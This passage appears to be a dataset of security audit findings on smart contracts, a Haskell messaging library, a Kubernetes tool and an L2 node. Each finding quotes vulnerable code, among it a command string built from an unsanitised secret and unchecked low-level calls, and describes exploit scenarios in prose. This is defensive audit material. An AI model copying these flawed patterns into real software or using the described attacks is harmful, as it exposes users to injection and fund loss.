minPercentageToAsk is 85%, and there is no royalty fee. The NFT project grows in popularity, which motivates Eve, the owner of the NFT collection, to raise the royalty fee to 9.5%, the maximum fee allowed by the RoyaltyFeeRegistry contract. Bob purchases Alices NFT. Alice receives 89.5% of the sale even though she could have received 98% of the sale at the time of the listing. Recommendations Short term, set minPercentageToAsk to 100% minus the sum of the protocol fee and the max value for a royalty fee, which is 9.5%. Long term, identify and validate the bounds for all parameters and variables in the smart contract system.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "5. Excessive privileges of RoyaltyFeeSetter and RoyaltyFeeRegistry owners ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The RoyaltyFeeSetter and RoyaltyFeeRegistry contract owners can manipulate an NFT collections royalty information, such as the fee percentage and the fee receiver; this violates the principle of least privilege. NFT collection owners can use the RoyaltyFeeSetter contract to set the royalty information for their NFT collections. This information is stored in the RoyaltyFeeRegistry contract. However, the owners of the two contracts can also update this information (gures 5.1 and 5.2). function updateRoyaltyInfoForCollection ( address collection , address setter , address receiver , uint256 fee ) external override onlyOwner { require (fee <= royaltyFeeLimit, \"Registry: Royalty fee too high\" ); _royaltyFeeInfoCollection[collection] = FeeInfo({ setter: setter, receiver: receiver, fee: fee }); emit RoyaltyFeeUpdate(collection, setter, receiver, fee); } Figure 5.1: The updateRoyaltyInfoForCollection function in RoyaltyFeeRegistry :54- function updateRoyaltyInfoForCollection ( address collection , address setter , address receiver , uint256 fee ) external onlyOwner { IRoyaltyFeeRegistry(royaltyFeeRegistry).updateRoyaltyInfoForCollection( collection, setter, receiver, fee ); } Figure 5.2: The updateRoyaltyInfoForCollection function in RoyaltyFeeSetter :102-109 This violates the principle of least privilege. Since it is the responsibility of the NFT collections owner to set the royalty information, it is unnecessary for contract owners to have the same ability. Exploit Scenario Alice, the owner of the RoyaltyFeeSetter contract, sets the incorrect receiver address when updating the royalty information for Bobs NFT collection. Bob is now unable to receive fees from his NFT collections secondary sales. Recommendations Short term, remove the ability for users to update an NFT collections royalty information. Long term, clearly document the responsibilities and levels of access provided to privileged users of the system. 6. Insu\u0000cient protection of sensitive information Severity: Low Diculty: High Type: Conguration Finding ID: TOB-LR-6 Target: contracts/hardhat.config.ts", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Contracts used as dependencies do not track upstream changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The LooksRare codebase uses a third-party contract, SignatureChecker , but the LooksRare documentation does not specify which version of the contract is used or whether it was modied. This indicates that the LooksRare protocol does not track upstream changes in contracts used as dependencies. Therefore, the LooksRare contracts may not reliably reect updates or security xes implemented in their dependencies, as those updates must be manually integrated into the contracts. Exploit Scenario A third-party contract used in LooksRare receives an update with a critical x for a vulnerability, but the update is not manually integrated in the LooksRare version of the contract. An attacker detects the use of a vulnerable contract in the LooksRare protocol and exploits the vulnerability against one of the contracts. Recommendations Short term, review the codebase and document the source and version of each dependency. Include third-party sources as submodules in the projects Git repository to maintain internal path consistency and ensure that dependencies are updated periodically. Long term, use an Ethereum development environment and NPM to manage packages in the project.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "8. Missing event for a critical operation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The system does not emit an event when a protocol fee is levied in the _transferFeesAndFunds and _transferFeesAndFundsWithWETH functions. Operations that transfer value or perform critical operations should trigger events so that users and o-chain monitoring tools can account for important state changes. if ((protocolFeeRecipient != address (0)) && (protocolFeeAmount != 0)) { IERC20(currency).safeTransferFrom(from, protocolFeeRecipient, protocolFeeAmount); finalSellerAmount -= protocolFeeAmount; } Figure 8.1: Protocol fee transfer in _transferFeesAndFunds function ( contracts/executionStrategies/StrategyDutchAuction.sol#L440-L443 ) Exploit Scenario A smart contract wallet provider has a LooksRare integration that enables its users to buy and sell NFTs. The front end relies on information from LooksRares subgraph to itemize prices, royalties, and fees. Because the system does not emit an event when a protocol fee is incurred, an under-calculation in the wallet providers accounting leads its users to believe they have been overcharged. Recommendations Short term, add events for all critical operations that transfer value, such as when a protocol fee is assessed. Events are vital aids in monitoring contracts and detecting suspicious behavior. Long term, consider adding or accounting for a new protocol fee event in the LooksRare subgraph and any other o-chain monitoring tools LooksRare might be using.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Taker orders are not EIP-712 signatures ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "When takers attempt to match order proposals, they are presented with an obscure blob of data. In contrast, makers are presented with a formatted data structure that makes it easier to validate transactions. struct TakerOrder { bool isOrderAsk ; // true --> ask / false --> bid address taker ; // msg.sender uint256 price ; // final price for the purchase uint256 tokenId ; uint256 minPercentageToAsk ; // // slippage protection (9000 --> 90% of the final price must return to ask) bytes params ; // other params (e.g., tokenId) } Figure 9.1: The TakerOrder struct in OrderTypes.sol :31-38 While this issue cannot be exploited directly, it creates an asymmetry between the user experience (UX) of makers and takers. Because of this, users depend on the information that the user interface (UI) displays to them and are limited by the UX of the wallet software they are using. Exploit Scenario 1 Eve, a malicious user, lists a new collection with the same metadata as another, more popular collection. Bob sees Eves listing and thinks that it is the legitimate collection. He creates an order for an NFT in Eves collection, and because he cannot distinguish the parameters of the transaction he is signing, he matches it, losing money in the process. Exploit Scenario 2 Alice, an attacker, compromises the UI, allowing her to manipulate the information displayed by it in order to make illegitimate collections look legitimate. This is a more extreme exploit scenario. Recommendations Short term, evaluate and document the current UI and the pitfalls that users might encounter when matching and creating orders. Long term, evaluate whether adding support for EIP-712 signatures in TakerOrder would minimize the issue and provide a better UX.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The LooksRare contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the LooksRare contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "11. isContract may behave unexpectedly ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The LooksRare exchange relies on OpenZeppelins SignatureChecker library to verify signatures on-chain. This library, in turn, relies on the isContract function in the Address library to determine whether the signer is a contract or an externally owned account (EOA). However, in Solidity, there is no reliable way to denitively determine whether a given address is a contract, as there are several edge cases in which the underlying extcodesize function can return unexpected results. function isContract( address account) internal view returns ( bool ) { // This method relies on extcodesize, which returns 0 for contracts in // construction, since the code is only stored at the end of the // constructor execution. uint256 size; assembly { size := extcodesize (account) } return size > 0; } Figure 11.1: The isContract function in Address.sol #L27-37 Exploit Scenario A maker order is created and signed by a smart contract wallet. While this order is waiting to be lled, selfdestruct is called on the contract. The call to extcodesize returns 0, causing isContract to return false. Even though the order was signed by an ERC1271-compatible contract, the verify method will attempt to validate the signers address as though it were signed by an EOA. Recommendations Short term, clearly document for developers that SignatureChecker.verify is not guaranteed to accurately distinguish between an EOA and a contract signer, and emphasize that it should never be used in a manner that requires such a guarantee. Long term, avoid adding or altering functionality that would rely on a guarantee that a signatures source remains consistent over time.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "12. tokenId and amount fully controlled by the order strategy when matching two orders ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "When two orders are matched, the strategy dened by the MakerOrder is called to check whether the order can be executed. function matchAskWithTakerBidUsingETHAndWETH ( OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk ) external payable override nonReentrant { [...] // Retrieve execution parameters ( bool isExecutionValid , uint256 tokenId , uint256 amount ) = IExecutionStrategy(makerAsk.strategy) .canExecuteTakerBid(takerBid, makerAsk); require (isExecutionValid, \"Strategy: Execution invalid\" ); [...] } Figure 12.1: matchAskWithTakerBidUsingETHAndWETH ( LooksRareExchange.sol#186-212 ) The strategy call returns a boolean indicating whether the order match can be executed, the tokenId to be sold, and the amount to be transferred. The LooksRareExchange contract does not verify these last two values, which means that the strategy has full control over them. function matchAskWithTakerBidUsingETHAndWETH ( OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk ) external payable override nonReentrant { [...] // Execution part 1/2 _transferFeesAndFundsWithWETH( makerAsk.strategy, makerAsk.collection, tokenId, makerAsk.signer, takerBid.price, makerAsk.minPercentageToAsk ); // Execution part 2/2 _transferNonFungibleToken(makerAsk.collection, makerAsk.signer, takerBid.taker, tokenId, amount); emit TakerBid( askHash, makerAsk.nonce, takerBid.taker, makerAsk.signer, makerAsk.strategy, makerAsk.currency, makerAsk.collection, tokenId, amount, takerBid.price ); } Figure 12.2: matchAskWithTakerBidUsingETHAndWETH ( LooksRareExchange.sol#217-228 ) This ultimately means that a faulty or malicious strategy can cause a loss of funds (e.g., by returning a dierent tokenId from the one that was intended to be sold or bought). Additionally, this issue may become problematic if strategies become trustless and are no longer developed or allowlisted by the LooksRare team. Exploit Scenario A faulty strategy, which returns a dierent tokenId than expected, is allowlisted in the protocol. Alice creates a new order using that strategy to sell one of her tokens. Bob matches Alices order, but because the tokenId is not validated before executing the order, he gets a dierent token than he intended to buy. Recommendations Short term, evaluate and document this behavior and use this documentation when integrating new strategies into the protocol. Long term, consider adding further safeguards to the LooksRareExchange contract to check the validity of the tokenId and the amount returned by the call to the strategy.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "13. Risk of phishing due to data stored in maker order params eld ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The MakerOrder struct contains a params eld, which holds arbitrary data for each strategy. This storage of data may increase the chance that users could be phished. struct MakerOrder { bool isOrderAsk; // true --> ask / false --> bid address signer; // signer of the maker order address collection; // collection address uint256 price; // price (used as ) uint256 tokenId; // id of the token uint256 amount; // amount of tokens to sell/purchase (must be 1 for ERC721, 1+ for ERC1155) address strategy; // strategy for trade execution (e.g., DutchAuction, StandardSaleForFixedPrice) address currency; // currency (e.g., WETH) uint256 nonce; // order nonce (must be unique unless new maker order is meant to override existing one e.g., lower ask price) uint256 startTime; // startTime in timestamp uint256 endTime; // endTime in timestamp uint256 minPercentageToAsk; // slippage protection (9000 --> 90% of the final price must return to ask) bytes params; // additional parameters uint8 v; // v: parameter (27 or 28) bytes32 r; // r: parameter bytes32 s; // s: parameter } Figure 13.1: The MakerOrder struct in contracts/libraries/OrderTypes.sol#L12-29 In the Dutch auction strategy, the maker params eld denes the start price for the auction. When a user generates the signature, the UI must specify the purpose of params . function canExecuteTakerBid (OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk) external view override returns ( bool , uint256 , uint256 ) { } uint256 startPrice = abi.decode(makerAsk.params, ( uint256 )); uint256 endPrice = makerAsk.price; Figure 13.2: The canExecuteTakerBid function in contracts/executionStrategies/StrategyDutchAuction.sol#L39-L70 When used in a StrategyPrivateSale transaction, the params eld holds the buyer address that the private sale is intended for. function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk) external view override returns ( bool , uint256 , uint256 ) { // Retrieve target buyer address targetBuyer = abi.decode(makerAsk.params, ( address )); return ( ((targetBuyer == takerBid.taker) && (makerAsk.price == takerBid.price) && (makerAsk.tokenId == takerBid.tokenId) && (makerAsk.startTime <= block.timestamp ) && (makerAsk.endTime >= block.timestamp )), makerAsk.tokenId, makerAsk.amount ); } Figure 13.3: The canExecuteTakerBid function in contracts/executionStrategies/StrategyPrivateSale.sol Exploit Scenario Alice receives an EIP-712 signature request through MetaMask. Because the value is masked in the params eld, Alice accidentally signs an incorrect parameter that allows an attacker to match. Recommendations Short term, document the expected values for the params value for all strategies and add in-code documentation to ensure that developers are aware of strategy expectations. Long term, document the risks associated with o-chain signatures and always ensure that users are aware of the risks of signing arbitrary data.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "14. Use of legacy openssl version in solidity-coverage plugin ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The LooksRare codebase uses a version of solidity-coverage that relies on a legacy version of openssl to run. While this plugin does not alter protocol contracts deployed to production, the use of outdated security protocols anywhere in the codebase may be risky or prone to errors. Error in plugin solidity-coverage: Error: error:0308010C:digital envelope routines::unsupported Figure 14.1: Error raised by npx hardhat coverage Recommendations Short term, refactor the code to use a new version of openssl to prevent the exploitation of openssl vulnerabilities. Long term, avoid using outdated or legacy versions of dependencies.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "15. TypeScript compiler errors during deployment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "TypeScript throws an error while trying to compile scripts during the deployment process. scripts/helpers/deploy-exchange.ts:29:5 - error TS7053: Element implicitly has an 'any' type because expression of type 'string' can't be used to index type '{ mainnet: string; rinkeby: string; localhost: string; }'. No index signature with a parameter of type 'string' was found on type '{ mainnet: string; rinkeby: string; localhost: string; }'. 29 config.Fee.Standard[activeNetwork] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Figure 15.1: TypeScript error raised by npx hardhat run --network localhost scripts/hardhat/deploy-hardhat.ts In the config.ts le, the config object does not explicitly allow string types to be used as an index type for accessing its keys. Hardhat assigns a string type as the value of activeNetwork . As a result, TypeScript throws a compiler error when it tries to access a member of the config object using the activeNetwork value. Recommendations Short term, add type information to the config object that allows its keys to be accessed using string types. Long term, ensure that TypeScript can compile properly without errors in any and every potential context.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. X3DH does not apply HKDF to generate secrets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The extended triple Die-Hellman (X3DH) key agreement protocol works by computing three separate Die-Hellman computations between pairs of keys. In particular, each party has a longer term private and public key pair as well as a more short-term private and public key pair. The three separate Die-Hellman computations are performed between the various pairs of long term and short term keys. The key agreement is performed this way to simultaneously authenticate each party and provide forward secrecy, which limits the impact of compromised keys. When performing the X3DH key agreement, the nal shared secret is formed by applying HKDF to the concatenation of all three Die-Hellman outputs. The computation is performed this way so that the shared secret depends on the entropy of all three Die-Hellman computations. If the X3DH protocol is being used to generate multiple shared secrets (which is the case for SimpleX), then these secrets should be formed by computing the HKDF over all three Die-Hellman outputs and then splitting the output of HKDF into separate shared secrets. However, as shown in Figure 1.1, the SimpleX implementation of X3DH uses each of the three Die-Hellman outputs as separate secrets for the Double Ratchet protocol, rather than inputting them into HKDF and splitting the output. x3dhSnd :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhSnd spk1 spk2 ( E2ERatchetParams _ rk1 rk2) = x3dh (publicKey spk1, rk1) (dh' rk1 spk2) (dh' rk2 spk1) (dh' rk2 spk2) x3dhRcv :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhRcv rpk1 rpk2 ( E2ERatchetParams _ sk1 sk2) = x3dh (sk1, publicKey rpk1) (dh' sk2 rpk1) (dh' sk1 rpk2) (dh' sk2 rpk2) x3dh :: DhAlgorithm a => ( PublicKey a, PublicKey a) -> DhSecret a -> DhSecret a -> DhSecret a -> RatchetInitParams x3dh (sk1, rk1) dh1 dh2 dh3 = RatchetInitParams {assocData, ratchetKey = RatchetKey sk, sndHK = Key hk, rcvNextHK = Key nhk} where assocData = Str $ pubKeyBytes sk1 <> pubKeyBytes rk1 (hk, rest) = B .splitAt 32 $ dhBytes' dh1 <> dhBytes' dh2 <> dhBytes' dh3 (nhk, sk) = B .splitAt 32 rest Figure 1.1: simplexmq/src/Simplex/Messaging/Crypto/Ratchet.hs#L98-L112 Performing the X3DH protocol this way will increase the impact of compromised keys and have implications for the theoretical forward secrecy of the protocol. To see why this is the case, consider what happens if a single key pair, (sk2 , spk2) , is compromised. In the current implementation, if an attacker compromises this key pair, then they can immediately recover the header key, hk , and the ratchet key, sk . However, if this were implemented by rst computing the HKDF over all three Die-Hellman outputs, then the attacker would not be able to recover these keys without also compromising another key pair. Note that SimpleX does not perform X3DH with long-term identity keys, as the SimpleX protocol does not rely on long-term keys to identify client devices. Therefore, the impact of compromising a key will be less severe, as it will aect only the secrets of the current session. Exploit Scenario An attacker is able to compromise a single X3DH key pair of a client using SimpleX chat. Because of how the X3DH is performed, they are able to then compromise the clients header key and ratchet key and can decrypt some of their messages. Recommendations Short term, adjust the X3DH implementation so that HKDF is computed over the concatenation of dh1 , dh2 , and dh3 before obtaining the ratchet key and header keys.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. The pad function is incorrect for long messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The pad function from the Simplex.Messaging.Crypto module uses the fromIntegral function, resulting in an integer overow bug that leads to incorrect length encoding for messages longer than 65535 bytes (Figure 2.1). At the moment, the function appears to be called only with messages that are less than that; however, due to the general nature of the module, there is a risk of using a pad with longer messages as the message length assumption is not documented. pad :: ByteString -> Int -> Either CryptoError ByteString pad msg paddedLen | padLen >= 0 = Right $ encodeWord16 (fromIntegral len) <> msg <> B .replicate padLen '#' | otherwise = Left CryptoLargeMsgError where len = B .length msg padLen = paddedLen - len - 2 Figure 2.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L805-L811 Exploit Scenario The pad function is used on messages longer than 65535 bytes, introducing a security vulnerability. Recommendations Short term, change the pad function to check the message length if it ts into 16 bits and return CryptoLargeMsgError if it does not. Long term, write unit tests for the pad function. Avoid using fromIntegral to cast to smaller integer types; instead, create a new function that will safely cast to smaller types that returns Maybe .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. The unPad function throws exception for short messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The unPad function throws an undocumented exception when the input is empty or a single byte. This is due to the decodeWord16 function, which throws an IOException if the input is not exactly two bytes. The unPad function does not appear to be used on such short inputs in the current code. unPad :: ByteString -> Either CryptoError ByteString unPad padded | B .length rest >= len = Right $ B .take len rest | otherwise = Left CryptoLargeMsgError where ( lenWrd , rest) = B .splitAt 2 padded len = fromIntegral $ decodeWord16 lenWrd Figure 3.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L813-L819 Exploit Scenario The unPad function takes a user-controlled input and throws an exception that is not handled in a thread that is critical to the functioning of the protocol, resulting in a denial of service. Recommendations Short term, validate the length of the input passed to the unPad function and return an error if the input is too short. Long term, write unit tests for the unPad function to ensure the validation works as intended.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Key material resides in unpinned memory and is not cleared after its lifetime ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The key material generated and processed by the SimpleXMQ library resides in unpinned memory, and the data is not cleared out from the memory as soon as it is no longer used. The key material will stay on the Haskell heap until it is garbage collected and overwritten by other data. Combined with unpinned memory pages where the Haskells heap is allocated, this creates a risk of paging out unencrypted memory pages with the key material to disk. Because the memory management is abstracted away by the language, the manual memory management required to pin and zero-out the memory in garbage-collected language as Haskell is challenging. This issue does not concern the communication security; only device security is aected. Exploit Scenario The unencrypted key material is paged out to the hard drive, where it is exposed and can be stolen by an attacker. Recommendations Short term, investigate the use of mlock/mlockall on supported platforms to prevent memory pages that contain key material to be paged out. Explicitly zero out the key material as soon as it is no longer needed. Long term, document the key material memory management and the threat model around it.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Insecure defaults in generated artifacts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-eclipse-jkube-securityreview.pdf", "body": "JKube can generate Kubernetes deployment artifacts and deploy applications using those artifacts. By default, many of the security features oered by Kubernetes are not enabled in these artifacts. This can cause the deployed applications to have more permissions than their workload requires. If such an application were compromised, the permissions would enable the attacker to perform further attacks against the container or host. Kubernetes provides several ways to further limit these permissions, some of which are documented in appendix E . Similarly, the generated artifacts do not employ some best practices, such as referencing container images by hash, which could help prevent certain supply chain attacks. We compiled several of the examples contained in the quickstarts folder and analyzed them. We observed instances of the following problems in the artifacts produced by JKube:         Pods have no associated network policies . Dockerles have base image references that use the latest tag. Container image references use the latest tag, or no tag, instead of a named tag or a digest. Resource (CPU, memory) limits are not set. Containers do not have the allowPrivilegeEscalation setting set. Containers are not congured to use a read-only lesystem. Containers run as the root user and have privileged capabilities. Seccomp proles are not enabled on containers.  Service account tokens are mounted on pods where they may not be needed. Exploit Scenario An attacker compromises one application running on a Kubernetes cluster. The attacker takes advantage of the lax security conguration to move laterally and attack other system components. Recommendations Short term, improve the default generated conguration to enhance the security posture of applications deployed using JKube, while maintaining compatibility with most common scenarios. Apply automatic tools such as Checkov during development to review the conguration generated by JKube and identify areas for improvement. Long term, implement mechanisms in JKube to allow users to congure more advanced security features in a convenient way. References   Appendix D: Docker Recommendations Appendix E: Hardening Containers Run via Kubernetes", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "2. Risk of command line injection from secret ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-eclipse-jkube-securityreview.pdf", "body": "As part of the Spring Boot watcher functionality, JKube executes a second Java process. The command line for this process interpolates an arbitrary secret, making it unsafe. This command line is then tokenized by separating on spaces. If the secret contains spaces, this process could allow an attacker to add arbitrary arguments and command-line ags and modify the behavior of this command execution. StringBuilder buffer = new StringBuilder( \"java -cp \" ); (...) buffer.append( \" -Dspring.devtools.remote.secret=\" ); buffer.append( remoteSecret ); buffer.append( \" org.springframework.boot.devtools.RemoteSpringApplication \" ); buffer.append(url); try { String command = buffer.toString(); log.debug( \"Running: \" + command); final Process process = Runtime.getRuntime().exec(command) ; Figure 2.1: A secret is used without sanitization on a command string that is then executed. ( jkube/jkube-kit/jkube-kit-spring-boot/src/main/java/org/eclipse/jkube/sp ringboot/watcher/SpringBootWatcher.java#136171 ) Exploit Scenario An attacker forks an open source project that uses JKube and Spring Boot, improves it in some useful way, and introduces a malicious spring.devtools.remote.secret secret in application.properties . A user then nds this forked project and sets it up locally. When the user runs mvn k8s:watch , JKube invokes a command that includes attacker-controlled content, compromising the users machine. Recommendations Short term, rewrite the command-line building code to use an array of arguments instead of a single command-line string. Java provides several variants of the exec method, such as exec(String[]) , which are safer to use when user-provided input is involved. Long term, integrate static analysis tools in the development process and CI/CD pipelines, such as Semgrep and CodeQL, to detect instances of similar problems early on. Review uses of user-controlled input to ensure they are sanitized if necessary and processed safely. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "1. Risk of miscongured GasPriceOracle state variables that can lock L2 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-optimism-securityreview.pdf", "body": "When bootstrapping the L2 network operated by op-geth , the GasPriceOracle contract is pre-deployed to L2, and its contract state variables are used to specify the L1 costs to be charged on L2. Three state variables are used to compute the costs decimals , overhead , and scalar which can be updated through transactions sent to the node. However, these state variables could be miscongured in a way that sets gas prices high enough to prevent transactions from being processed. For example, if overhead were set to the maximum value, a 256-bit unsigned integer, the subsequent transactions would not be accepted. In an end-to-end test of the above example, contract bindings used in op-e2e tests (such as the GasPriceOracle bindings used to update the state variables) were no longer able to make subsequent transactions/updates, as calls to SetOverhead or SetDecimals resulted in a deadlock. Sending a transaction directly through the RPC client did not produce a transaction receipt that could be fetched. Recommendations Short term, implement checks to ensure that GasPriceOracle parameters can be updated if fee parameters were previously miscongured. This could be achieved by adding an exception to GasPriceOracle fees when the contract owner calls methods within the contract or by setting a maximum fee cap. Long term, develop operational procedures to ensure the system is not deployed in or otherwise entered into an unexpected state as a result of operator actions. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "1. Transfer operations may silently fail due to the lack of contract existence checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The pool fails to check that a contract exists before performing transfers. As a result, the pool may assume that failed transactions involving destroyed tokens or tokens that have not yet been deployed were successful. Transfers.safeTransfer , TransferHelper.safeTransfer , and TransferHelper.safeTransferFrom use low-level calls to perform transfers without conrming the contracts existence: ) internal { ( bool success , bytes memory returnData) = address (token).call( abi.encodeWithSelector(token.transfer.selector, to, value) ); require (success && (returnData.length == 0 || abi.decode(returnData, ( bool ))), \"Transfer fail\" ); } Figure 1.1: rmm-core/contracts/libraries/Transfers.sol#16-21 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 1.2: The Solidity documentation details the necessity of executing existence checks before performing low-level calls. Therefore, if the tokens to be transferred have not yet been deployed or have been destroyed, safeTransfer and safeTransferFrom will return success even though the transfer was not executed. Exploit Scenario The pool contains two tokens: A and B. The A token has a bug, and the contract is destroyed. Bob is not aware of the issue and swaps 1,000 B tokens for A tokens. Bob successfully transfers 1,000 B tokens to the pool but does not receive any A tokens in return. As a result, Bob loses 1,000 B tokens. Recommendations Short term, implement a contract existence check before the low-level calls in Transfer.safeTransfer , TransferHelper.safeTransfer , and TransferHelper.safeTransferFrom . This will ensure that a swap will revert if the token to be bought no longer exists, preventing the pool from accepting the token to be sold without returning any tokens in exchange. Long term, avoid implementing low-level calls. If such calls are unavoidable, carefully review the Solidity documentation , particularly the Warnings section, before implementing them to ensure that they are implemented correctly.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "Although dependency scans did not indicate a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "3. Anyone could steal pool tokens earned interest ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "If a PrimitiveEngine contract is deployed with certain ERC20 tokens, unexpected token interest behavior could allow token interest to count toward the number of tokens required for the deposit , allocate , create , and swap functions, allowing the user to avoid paying in full. Liquidity providers use the deposit function to increase the liquidity in a position. The following code within the function veries that the pool has received at least the minimum number of tokens required by the protocol: if (delRisky != 0 ) balRisky = balanceRisky(); if (delStable != 0 ) balStable = balanceStable(); IPrimitiveDepositCallback( msg.sender ).depositCallback(delRisky, delStable, data); // agnostic payment if (delRisky != 0 ) checkRiskyBalance(balRisky + delRisky); if (delStable != 0 ) checkStableBalance(balStable + delStable); emit Deposit( msg.sender , recipient, delRisky, delStable); Figure 3.1: rmm-core/contracts/PrimitiveEngine.sol#213-217 Assume that both delRisky and delStable are positive. First, the code fetches the current balances of the tokens. Next, the depositCallback function is called to transfer the required number of each token to the pool contract. Finally, the code veries that each tokens balance has increased by at least the required amount. There could be a token that allows token holders to earn interest simply because they are token holders. To retrieve this interest, token holders could call a certain function to calculate the interest earned and increase their balances. An attacker could call this function from within the depositCallback function to pay out interest to the pool contract. This would increase the pools token balance, decreasing the number of tokens that the user needs to transfer to the pool contract to pass the balance check (i.e., the check conrming that the balance has suciently increased). In eect, the users token payment obligation is reduced because the interest accounts for part of the required balance increase. To date, we have not identied a token contract that contains such a functionality; however, it is possible that one exists or could be created. Exploit Scenario Bob deploys a PrimitiveEngine contract with token1 and token2. Token1 allows its holders to earn passive interest. Anyone can call get_interest(address) to make a certain token holders interest be claimed and added to the token holders balance. Over time, the pool can claim 1,000 tokens. Eve calls deposit , and the pool requires Eve to send 1,000 tokens. Eve calls get_interest(address) in the depositCallback function instead of sending the tokens, depositing to the pool without paying the minimum required tokens. Recommendations Short term, add documentation explaining to users that the use of interest-earning tokens can reduce the standard payments for deposit , allocate , create , and swap . Long term, using the Token Integration Checklist (appendix C), generate a document detailing the shortcomings of tokens with certain features and the impacts of their use in the Primitive protocol. That way, users will not be alarmed if the use of a token with nonstandard features leads to unexpected results.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "4. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf", "body": "The Primitive contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security 